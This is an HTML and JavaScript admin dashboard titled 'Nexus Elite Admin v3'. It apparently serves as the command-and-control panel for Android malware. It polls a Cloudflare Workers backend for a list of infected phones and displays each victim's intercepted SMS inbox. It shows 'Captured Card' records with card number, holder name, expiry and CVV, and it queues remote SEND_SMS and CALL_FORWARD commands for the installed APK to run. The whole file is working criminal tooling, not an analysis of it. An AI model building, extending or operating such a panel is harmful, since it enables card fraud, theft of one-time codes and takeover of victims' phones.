<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Nexus Elite Admin v3</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        body { background: #000; color: #fff; font-family: 'Outfit', sans-serif; -webkit-tap-highlight-color: transparent; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.08); }
        .neon-border { border-left: 4px solid #06b6d4; box-shadow: 0 0 20px rgba(6, 182, 212, 0.1); }
        
        #main-modal { display: none; position: fixed; inset: 0; background: #000; z-index: 100; flex-direction: column; padding: 20px; animation: slideUp 0.3s ease-out; }
        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
        
        .sync-spin { animation: spin 1s linear infinite; }
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }

        .btn-nav { background: #111; border: 1px solid #222; border-radius: 15px; width: 48px; height: 48px; display: flex; align-items: center; justify-content: center; transition: 0.2s; }
        .btn-nav:active { transform: scale(0.9); background: #fff; color: #000; }
        
        .menu-card { aspect-ratio: 1/1; border-radius: 28px; display: flex; flex-direction: column; align-items: center; justify-content: center; border: 1px solid rgba(255,255,255,0.05); transition: 0.3s; }
        .menu-card:active { transform: scale(0.95); background: rgba(255,255,255,0.1); }
    </style>
</head>
<body class="p-4 pb-20">

    <div class="flex justify-between items-center mb-8 sticky top-0 bg-black/80 backdrop-blur-md py-2 z-10">
        <div>
            <h1 class="text-3xl font-black italic tracking-tighter text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-indigo-500">NEXUS ELITE</h1>
            <p class="text-[10px] text-zinc-500 font-bold uppercase tracking-widest">Live Nodes: <span id="node-count" class="text-cyan-400">0</span></p>
        </div>
        <button class="btn-nav text-cyan-400" onclick="fetchDevices()">🔄</button>
    </div>

    <div id="device-list" class="space-y-4">
        <div class="py-20 text-center text-zinc-800 font-bold uppercase tracking-widest animate-pulse">Scanning Network...</div>
    </div>

    <div id="main-modal">
        <div class="flex justify-between items-center mb-10">
            <button class="btn-nav" onclick="closeControl()">🏠</button>
            <div class="text-center">
                <h2 id="m-device-name" class="font-black text-xl uppercase italic leading-none">DEVICE</h2>
                <p id="m-device-id" class="text-[10px] text-zinc-500 font-mono mt-1">ID: -- | BAT: --</p>
            </div>
            <button class="btn-nav text-rose-500" onclick="closeControl()">✖</button>
        </div>

        <div id="grid-menu" class="grid grid-cols-2 gap-4">
            <div class="menu-card bg-cyan-500/5" onclick="openPanel('sms')">
                <span class="text-3xl mb-2">📥</span><span class="text-[10px] font-black text-cyan-400 uppercase">Inbox</span>
            </div>
            <div class="menu-card bg-emerald-500/5" onclick="openPanel('send')">
                <span class="text-3xl mb-2">🚀</span><span class="text-[10px] font-black text-emerald-400 uppercase">Send SMS</span>
            </div>
            <div class="menu-card bg-rose-500/5" onclick="openPanel('card')">
                <span class="text-3xl mb-2">💳</span><span class="text-[10px] font-black text-rose-400 uppercase">Cards</span>
            </div>
            <div class="menu-card bg-orange-500/5" onclick="openPanel('fwd')">
                <span class="text-3xl mb-2">📞</span><span class="text-[10px] font-black text-orange-400 uppercase">Forward</span>
            </div>
            <div class="menu-card bg-purple-500/5 col-span-2 aspect-auto py-6" onclick="openPanel('info')">
                <span class="text-2xl mb-1">📱</span><span class="text-[10px] font-black text-purple-400 uppercase tracking-widest">Hardware Details</span>
            </div>
        </div>

        <div id="panel-container" class="hidden flex-col h-full">
            <div class="flex justify-between items-center mb-6">
                <button class="btn-nav" onclick="backToGrid()">⬅</button>
                <h3 id="panel-title" class="text-xs font-black uppercase tracking-widest">TITLE</h3>
                <button class="btn-nav" id="panel-sync-btn">🔄</button>
            </div>

            <div id="panel-scroll" class="overflow-y-auto flex-1 space-y-3 pb-10"></div>

            <div id="panel-form" class="hidden space-y-4 mb-10">
                <input id="target-num" type="number" placeholder="Enter Number" class="w-full bg-zinc-900 p-5 rounded-2xl border border-white/5 outline-none focus:border-cyan-500">
                <textarea id="target-msg" placeholder="Write Message..." class="w-full bg-zinc-900 p-5 rounded-2xl border border-white/5 outline-none focus:border-cyan-500 h-32"></textarea>
                <button id="exec-btn" class="w-full bg-white text-black py-5 rounded-2xl font-black uppercase text-xs tracking-widest shadow-lg shadow-white/5">Execute Command</button>
            </div>
        </div>
    </div>

    <script>
        const WORKER_URL = "https://dark-boat-4928.sumankkuuyy.workers.dev";
        let activeDevice = null;

        // 1. Fetch Live Devices from D1
        async function fetchDevices() {
            try {
                const res = await fetch(`${WORKER_URL}/api/admin/data?type=devices`);
                const data = await res.json();
                const list = document.getElementById('device-list');
                document.getElementById('node-count').innerText = data.length;
                
                if(data.length === 0) {
                    list.innerHTML = "<p class='text-center text-zinc-600 mt-10 uppercase text-xs font-bold'>No Active Nodes Found</p>";
                    return;
                }

                list.innerHTML = data.map(dev => `
                    <div class="glass p-5 rounded-[2rem] ${new Date() - new Date(dev.last_sync) < 60000 ? 'neon-border' : 'border-zinc-900'}" onclick="openControl('${dev.model}', '${dev.id}', '${dev.battery}')">
                        <div class="flex justify-between items-start mb-3">
                            <div class="flex items-center gap-3">
                                <div class="w-2 h-2 rounded-full ${new Date() - new Date(dev.last_sync) < 60000 ? 'bg-cyan-400 animate-pulse' : 'bg-zinc-800'}"></div>
                                <h3 class="font-bold text-sm uppercase tracking-tight">${dev.model}</h3>
                            </div>
                            <span class="text-[9px] font-mono text-zinc-600 uppercase italic">${dev.last_sync}</span>
                        </div>
                        <div class="flex justify-between text-[11px] font-bold">
                            <span class="text-zinc-600 font-mono">#${dev.id}</span>
                            <span class="${dev.battery > 20 ? 'text-cyan-400' : 'text-rose-500'}">BATTERY: ${dev.battery}%</span>
                        </div>
                    </div>
                `).join('');
            } catch (e) { console.error("Worker connection failed"); }
        }

        // 2. Control Modal Functions
        function openControl(name, id, bat) {
            activeDevice = id;
            document.getElementById('m-device-name').innerText = name;
            document.getElementById('m-device-id').innerText = `ID: ${id} | POWER: ${bat}%`;
            document.getElementById('main-modal').style.display = 'flex';
        }

        function closeControl() {
            document.getElementById('main-modal').style.display = 'none';
            backToGrid();
        }

        // 3. Panel Logic (SMS/Cards/Commands)
        async function openPanel(type) {
            const grid = document.getElementById('grid-menu');
            const panel = document.getElementById('panel-container');
            const scroll = document.getElementById('panel-scroll');
            const form = document.getElementById('panel-form');
            const title = document.getElementById('panel-title');
            const syncBtn = document.getElementById('panel-sync-btn');

            grid.style.display = 'none';
            panel.classList.replace('hidden', 'flex');
            scroll.innerHTML = "<div class='text-center py-20 animate-bounce text-[10px] font-bold text-zinc-700 uppercase'>Syncing with D1...</div>";
            form.classList.add('hidden');

            if (type === 'sms') {
                title.innerText = "INBOX VAULT";
                title.className = "text-xs font-black uppercase tracking-widest text-cyan-400";
                syncBtn.onclick = () => openPanel('sms');
                syncBtn.classList.add('sync-spin');
                
                const res = await fetch(`${WORKER_URL}/api/admin/data?type=sms&id=${activeDevice}`);
                const data = await res.json();
                syncBtn.classList.remove('sync-spin');
                
                scroll.innerHTML = data.map(m => `
                    <div class="p-4 glass rounded-2xl border-l-2 border-cyan-500">
                        <div class="flex justify-between mb-1">
                            <span class="text-[10px] font-black text-cyan-400 uppercase tracking-tighter">${m.sender}</span>
                            <span class="text-[8px] text-zinc-600">${m.time || ''}</span>
                        </div>
                        <p class="text-xs text-zinc-300 leading-relaxed">${m.body}</p>
                    </div>
                `).join('') || "<p class='text-center text-zinc-700 py-10'>Vault Empty</p>";
            }

            if (type === 'card') {
                title.innerText = "SECURE VAULT";
                title.className = "text-xs font-black uppercase tracking-widest text-rose-500";
                const res = await fetch(`${WORKER_URL}/api/admin/data?type=cards&id=${activeDevice}`);
                const data = await res.json();
                
                scroll.innerHTML = data.map(c => `
                    <div class="p-8 rounded-[2.5rem] bg-gradient-to-br from-zinc-900 to-black border border-white/10 shadow-2xl">
                        <div class="flex justify-between items-start mb-10">
                            <span class="text-[10px] font-bold text-rose-500 italic uppercase">Captured Card</span>
                            <div class="w-10 h-6 bg-zinc-800 rounded-md"></div>
                        </div>
                        <p class="text-lg font-mono tracking-[4px] text-center mb-8">${c.number}</p>
                        <div class="flex justify-between items-end">
                            <div><p class="text-[8px] text-zinc-600 uppercase">Holder</p><p class="text-xs font-bold uppercase">${c.name}</p></div>
                            <div class="flex gap-4">
                                <div><p class="text-[8px] text-zinc-600 uppercase">Exp</p><p class="text-xs font-bold">${c.exp}</p></div>
                                <div><p class="text-[8px] text-zinc-600 uppercase">CVV</p><p class="text-xs font-bold">${c.cvv}</p></div>
                            </div>
                        </div>
                    </div>
                `).join('') || "<p class='text-center text-zinc-700 py-10'>No Cards Captured</p>";
            }

            if (type === 'send' || type === 'fwd') {
                title.innerText = type === 'send' ? "REMOTE SEND" : "CALL FORWARD";
                title.className = `text-xs font-black uppercase tracking-widest ${type === 'send' ? 'text-emerald-400' : 'text-orange-400'}`;
                scroll.innerHTML = "";
                form.classList.remove('hidden');
                document.getElementById('exec-btn').onclick = () => runCommand(type === 'send' ? 'SEND_SMS' : 'CALL_FORWARD');
            }
        }

        async function runCommand(action) {
            const num = document.getElementById('target-num').value;
            const msg = document.getElementById('target-msg').value;
            if(!num) return alert("Enter Number!");

            const res = await fetch(`${WORKER_URL}/api/admin/command`, {
                method: "POST",
                body: JSON.stringify({ device_id: activeDevice, action, payload: { number: num, message: msg } })
            });
            if(res.ok) alert("Command Queued! APK will execute in 5s.");
        }

        function backToGrid() {
            document.getElementById('panel-container').classList.replace('flex', 'hidden');
            document.getElementById('grid-menu').style.display = 'grid';
        }

        // Init
        fetchDevices();
        setInterval(fetchDevices, 15000); // 15s Auto-refresh
    </script>
</body>
</html>
